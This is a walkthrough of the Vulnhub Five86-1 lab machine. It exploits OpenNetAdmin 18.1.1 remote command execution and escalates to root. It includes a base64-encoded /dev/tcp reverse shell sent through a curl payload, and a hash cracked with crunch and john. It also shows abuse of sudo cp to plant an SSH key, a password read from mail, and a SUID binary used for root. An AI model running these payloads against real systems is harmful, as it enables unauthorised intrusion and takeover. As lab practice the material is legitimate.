This second service scan reported me a */robots.txt* and a potential path in it */ona*. The SSH and Apache versions were not vulnerable a priori, so I decided to access port 80.

Nothing interesting, a blank page, I proceeded to view port 10000.

I had a login panel to *Webmin*, I tried basic credentials: admin, admin and they did not work, knowing the version of this service I looked for vulnerabilities.

I found a remote command execution exploit without authentication but it didn't apply.

![image](https://user-images.githubusercontent.com/69093629/223872210-f8a1f443-b304-48f3-b9a9-6abb5c07d2ee.png)

I continued my investigation by looking at *robots.txt*.

This was where the route previously reported by *nmap* was located, so nothing interesting from there on. Accessing the route */ona* I found the following:

Something interesting I saw is that we are authenticated as a guest user.

At the top right I was told what this panel was about, it was OpenNetAdmin, a service for network management. At this point I was interested in knowing the version of it to look for exploits of it.

It was version 18.1.1 of this, search for *exploits* with **searchsploit**.

I found 3 *exploits*, 2 that were supposed to work, one from Metasploit. I downloaded the bash script.

```

The structure of this *exploit* is as follows:
<ol>
  <li>Takes the first argument passed to *exploit* (The server URL) and stores it as `URL`</li>
  <li>Starts an infinite loop followed by an *input* that saves the command we want to execute in the variable `cmd`.</li>
  <li>Sends a prepared request and filters the output of the previously entered command using regular expressions.</li>
</ol>

If we try to execute the `curl` command replacing `URL` and `cmd` we will see that we get remote command execution, in this case we are the user *www-data*.

www-data
```

So I tried to get a reverse shell and it gave me problems, so the way that worked for me is the following.
The first thing I did was to base64 encode the code that would make the machine connect to me.

```
┌──(root㉿kali)-[/home/kali/Vulnhub/Five86]
└─# echo "sh -i >& /dev/tcp/192.168.1.136/443 0>&1" | base64   
c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEzNi80NDMgMD4mMQo=
```

And now just decode the string to Base64 and pipe the result into *bash*.

```
┌──(root㉿kali)-[/home/kali/Vulnhub/Five86]
└─# curl --silent -d "submit=window_submitr=1574117726710&submit[]=tooltips[]=ip%3D%3Echo \"BEGIN\";echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEzNi80NDMgMD4mMQo= |.bash\"END\"&xajaxargs[]=ping" | sed -n -e '/BEGINNING/,/END/ p' | tail -n +2 | head -n -1
```

Run the command and gain access as `www-data`.

I also had to change the rows and columns that this one had, on my machine it had 17 and 157.

```

And on the victim machine 24 and 80.

I saw what files were in the current directory but nothing interesting.

```

config  config_dnld.php  dcm.php  images  include  index.php  local  login.php  logout.php  modules  plugins  winc  workspace_plugins
www-data@five86-1:/opt/ona/www$
```

After a little research I found a *.htpasswd* in */var/www/* that I had read permissions on.

```
www-data@five86-1:/var/www$ ls
html
www-data@five86-1:/var/www$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Jan  1  2020 .

drwxr-xr-x  3 root root 4096 Jan  1  2020 html
www-data@five86-1:/var/www$
```

Its content was as follows:

```bash
www-data@five86-1:/var/www$ cat .htpasswd
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt
```

There was a username and a hash. There was also a message saying that a conventional dictionary like rockyou.txt would fail to crack this hash and that I could use the characters aefhrt with a ten character password pattern to crack it. Basically what I needed to do was generate a dictionary of credentials with a 10 character pattern that explicitly contained those characters.

What I did was run crunch specifying the minimum and maximum characters required followed by the string provided by the *.htpasswd*. Finally I exported the result to the pass.txt file.

```bash
┌──(root㉿kali)-[/home/kali/Vulnhub/Five86]
└─# crunch 10 10 aefhrt -o pass.txt                                                                                                  
Crunch will now generate the following amount of data: 665127936 bytes
634 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 60466176 

crunch: 100% completed generating output
```

Once the dictionary was generated I realized that it was much larger than rockyou.txt.

```bash
┌──(root㉿kali)-[/home/kali/Vulnhub/Five86]
└─# wc -l pass.txt
60466176 pass.txt
```

This would take a long time to complete. What I did was make it shorter, since the crunch command I used generated credentials that contain some of the characters I specified, not all of them. So I applied the following regular expression to filter for all credentials that contain aefhrt.

```bash
┌──(root㉿kali)-[/home/kali/Vulnhub/Five86]
└─# awk '/a/&&/e/&&/f/&&/h/&&/r/&&/t/' pass.txt > pass_final.txt
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Vulnhub/Five86]
└─# wc -l pass_final.txt
16435440 pass_final.txt
```

Now that you have a lot less credentials, start the attack with `john`.

```bash
┌──(root㉿kali)-[/home/kali/Vulnhub/Five86]
└─# john --wordlist=pass_final.txt hash

```

Well, I managed to crack the password: fatherrrrr. I noticed that douglas was an active user on the system, so I tried to authenticate with this credential and it worked.

```bash
www-data@five86-1:/var/www$ su douglas
Password: 
douglas@five86-1:/var/www$ whoami
douglas
```

Being Douglas I searched for all files and directories from root that I owned and removed the *proc* and *sys* strings that are obtained in the *output* of the command, but I found nothing interesting.

```
douglas@five86-1:/var/www$ find / -user douglas 2>/dev/null | grep -vE 'proc|sys'
/run/user/1005
/home/douglas
/home/douglas/.ssh
/home/douglas/.ssh/id_rsa.pub
/home/douglas/.ssh/id_rsa
/home/douglas/.bash_history
/home/douglas/.local
/home/douglas/.local/share
/home/douglas/.local/share/nano
```

I realized I could run `/bin/cp` as the user *Jen*.

```bash
douglas@five86-1:~$ sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (only) NOPASSWD: /bin/cp
```

There are two ways to try to escalate at this point by taking advantage of the naturalness of SSH:

<ol>
  <li>Copy the private key (if any) of user jen to /tmp and try to access via SSH using this as the identity key (if it was not encrypted).</li>
  <li>Copy my public key and store it as authorized_keys in jen's .ssh directory for SSH access without credentials.</li>
</ol>

In this specific case I used the second option, the user jen did not have an id_rsa in /home/jen/.ssh/jen.

```bash
┌──(root㉿kali)-[~/.ssh]

```

Once I had my public key in /tmp as authorized_keys I copied it to /home/jen/.ssh/authorized_keys as the user jen.

```bash

```

Now I simply log in via SSH without credentials as the user jen.

```bash

```bash
jen@five86-1:~$ find / -user jen 2>/dev/null | grep -vE "proc|sys"
/run/user/1003
/var/mail/jen
/dev/pts/1
/home/jen
/home/jen/.ssh
/home/jen/.ssh/authorized_keys
/home/jen/reports
/home/jen/reports/Audit.txt
/home/jen/reports/IT_Budget.txt
/home/jen/.bash_history
```

In this case I did find a path that interested me: */var/mail/jen*. It was an email from Roy to Jen informing her that Moss's (system user) password was **Fire!Fire!**.

```bash
jen@five86-1:~$ cat /var/mail/jen

Hi Jen,

As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.

But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!

Moss will understand (ha ha ha ha).

Tanks,
Roy
```

I tried to authenticate with that credential to the user Moss and it was successful.

```
jen@five86-1:~$ ls /home
douglas  jen  moss  richmond  roy
jen@five86-1:~$ su moss
Password: 
moss@five86-1:/home/jen$ whoami
moss
moss@five86-1:/home/jen$
```

Being Moss I searched for all the binaries that are running as SUID and found a supposed "game".

```
moss@five86-1:~$ find / -perm -4755 2>/dev/null
/var/games/animals
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4
/home/moss/.games/upyourgame
```

I ran it, answered 5 questions with "yes" and automatically gained root access 😞 . It seemed like a joke but it did turn me into root.

```
moss@five86-1:/var/games/animals$ /home/moss/.games/upyourgame
Would you like to play a game? yes

Could you please repeat that? yes

Nope, you'll need to enter that again. yes

You entered: No.  Is this correct? yes

We appear to have a problem?  Do we have a problem? yes

Made in Britain.
# whoami
root

```

I looked deeper into the binary code in Ghidra and it looked like this:

It simply asks the questions and reads the user input into the corresponding variables, at the end of the program it changes the UID to 0 (root) and spawns a `/bin/sh`.
